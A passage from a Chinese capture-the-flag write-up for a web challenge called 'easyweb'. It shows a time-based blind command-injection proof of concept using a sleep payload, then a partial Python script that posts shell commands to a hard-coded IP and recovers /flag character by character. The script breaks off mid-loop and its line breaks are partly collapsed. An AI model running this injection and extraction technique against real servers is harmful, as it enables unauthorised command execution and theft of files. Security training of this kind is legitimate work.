★easyweb


页面header被设置了Post: cmd，提醒可以执行命令；存在命令执行盲注

poc：cmd=if [ $(echo 1|cut -c1) = '1' ];then sleep 3;fi

猜测flag在/flag，用以下脚本跑出flag：


# encoding:utf-8import requestsimport timefrom urllib.parse import quote
url = 'http://119.3.37.185/'
if __name__ == '__main__':    pos = 1    flag = ''    sleep_time = 4    sess = requests.session()
    cmd = 'cat /f*'    post_par = "if [ $({}|cut -c{}) = '{}' ];then sleep {};fi"
    while True:        for i in range(32, 127):            t1 = time.time()

            # print('test:', chr(i))            # print(post_par.format(cmd, pos, chr(i), sleep_time))            # exit()

            try:                r = sess.post(                    url=url,                    data={                        'cmd': post_par.format(cmd, pos, chr(i), sleep_time)                    },                    timeout=7                )
